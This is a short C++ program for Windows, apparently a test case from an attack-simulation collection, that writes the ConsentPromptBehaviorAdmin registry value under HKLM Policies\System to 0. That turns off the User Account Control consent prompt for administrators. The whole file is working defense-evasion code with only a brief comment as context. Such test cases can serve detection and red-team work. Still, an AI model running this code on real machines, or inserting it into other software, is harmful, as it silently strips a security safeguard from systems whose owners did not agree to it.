//Author: Shaddy43
//This testcase needs admin privileges!

#include <windows.h>
#include <stdio.h>

int main()
{
    HKEY hKey;
    DWORD value = 0;
    try
    {
        // Open the registry key
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
        {
            // Set the ConsentPromptBehaviorAdmin value to 0 to disable UAC
            int result = RegSetValueEx(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
            if (result == ERROR_SUCCESS) {
                // The operation succeeded
                printf("UAC prompt disabled !!! \n");
            }
            else {
                // The operation failed
                printf("Registry key modification failed with error code %d.\n", result);
            }

            RegCloseKey(hKey);
        }
        else
        {
            printf("Disable UAC Prompt Failed!");
        }
    }
    catch (int e)
    {
        printf("Exception caught! %d", e);
    }
    return 0;
}